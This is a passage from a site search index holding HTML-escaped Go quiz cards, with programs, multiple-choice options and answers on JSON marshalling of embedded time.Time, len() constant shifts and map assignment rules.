style=\"color:#a6e22e\"\u003ejsonStr2\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e`{\u0026#34;age\u0026#34;: 12,\u0026#34;name\u0026#34;: \u0026#34;potter\u0026#34;, \u0026#34;child\u0026#34;:[3,4,5,7,8,9]}`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUnmarshal\u003c/span\u003e([]byte(\u003cspan style=\"color:#a6e22e\"\u003ejsonStr2\u003c/span\u003e), \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eaa\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. [1 2 3] [1 2 3]\u003c/li\u003e\n\u003cli\u003eB. [1 2 3] [3 4 5]\u003c/li\u003e\n\u003cli\u003eC. [1 2 3] [3 4 5 6 7 8 9]\u003c/li\u003e\n\u003cli\u003eD. [1 2 3] [3 4 5 0 0 0]\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/BRdAwDKfZt4\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eB\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ejson1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;encoding/json\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;time\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eTime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eN\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eDate\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e2020\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e12\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUTC\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMarshal\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%s\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. {\u0026ldquo;Time\u0026rdquo;:\u0026ldquo;2020-12-20T00:00:00Z\u0026rdquo;,\u0026ldquo;N\u0026rdquo;:5}\u003c/li\u003e\n\u003cli\u003eB. \u0026ldquo;2020-12-20T00:00:00Z\u0026rdquo;\u003c/li\u003e\n\u003cli\u003eC. {\u0026ldquo;N\u0026rdquo;:5}\u003c/li\u003e\n\u003cli\u003eD. \u003ccode\u003e\u0026lt;nil\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eE. else\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/ylPvSph0WKu\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eB\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"JSON"},{"categories":null,"contents":" len package main func main() { var x *struct { s [][32]byte } println(len(x.s[99])) } A. panic B. compilation error C. 32 D. 0 Answer Try it C len1 package main const s = \u0026#34;Go101.org\u0026#34; // len(s) == 9 // 1 \u0026lt;\u0026lt; 9 == 512 // 512 / 128 == 4 var a byte = 1 \u0026lt;\u0026lt; len(s) / 128 var b byte = 1 \u0026lt;\u0026lt; len(s[:]) / 128 func main() { println(a, b) } A: 0 0 B: 0 4 C: 4 0 D: 4 4 Answer Try it C len2 package main var s = \u0026#34;Go101.org\u0026#34; // len(s) == 9 // 1 \u0026lt;\u0026lt; 9 == 512 // 512 / 128 == 4 var a byte = 1 \u0026lt;\u0026lt; len(s) / 128 var b byte = 1 \u0026lt;\u0026lt; len(s[:]) / 128 func main() { println(a, b) } A: 0 0 B: 0 4 C: 4 0 D: 4 4 Answer Try it A ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/questions/len/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003elen\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e [][\u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tprintln(len(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e99\u003c/span\u003e]))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. panic\u003c/li\u003e\n\u003cli\u003eB. compilation error\u003c/li\u003e\n\u003cli\u003eC. 32\u003c/li\u003e\n\u003cli\u003eD. 0\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/5JSJUg9DlVm\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eC\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003elen1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Go101.org\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// len(s) == 9\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 1 \u0026lt;\u0026lt; 9 == 512\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 512 / 128 == 4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e[:]) \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tprintln(\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA: 0 0\u003c/li\u003e\n\u003cli\u003eB: 0 4\u003c/li\u003e\n\u003cli\u003eC: 4 0\u003c/li\u003e\n\u003cli\u003eD: 4 4\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/TqAKcTqRFDo\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eC\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003elen2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Go101.org\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// len(s) == 9\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 1 \u0026lt;\u0026lt; 9 == 512\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 512 / 128 == 4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e[:]) \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tprintln(\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA: 0 0\u003c/li\u003e\n\u003cli\u003eB: 0 4\u003c/li\u003e\n\u003cli\u003eC: 4 0\u003c/li\u003e\n\u003cli\u003eD: 4 4\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/BGB-z-cJhP2\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eA\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Len"},{"categories":null,"contents":" map package main import \u0026#34;fmt\u0026#34; type Student struct { Name string } var list map[string]Student func main() { list = make(map[string]Student) student := Student{\u0026#34;Aceld\u0026#34;} list[\u0026#34;student\u0026#34;] = student list[\u0026#34;student\u0026#34;].Name = \u0026#34;LDB\u0026#34; fmt.Println(list[\u0026#34;student\u0026#34;]) } Answer Try it compilation error cannot assign to struct field list[\"student\"].Name in map map1 package main func main() { m := make(map[int]int, 3) x := len(m) m[1] = m[1] y := len(m) println(x, y) } Answer Try it 0 1 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/questions/map/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003emap\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eName\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elist\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003emap\u003c/span\u003e[\u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e]\u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elist\u003c/span\u003e = make(\u003cspan style=\"color:#66d9ef\"\u003emap\u003c/span\u003e[\u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e]\u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003estudent\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e{\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Aceld\u0026#34;\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elist\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;student\u0026#34;\u003c/span\u003e] = \u003cspan style=\"color:#a6e22e\"\u003estudent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elist\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;student\u0026#34;\u003c/span\u003e].\u003cspan style=\"color:#a6e22e\"\u003eName\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;LDB\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003elist\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;student\u0026#34;\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/gkPDhQyDAQW\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003ecompilation error\ncannot assign to struct field list[\"student\"].Name in map\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003emap1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" 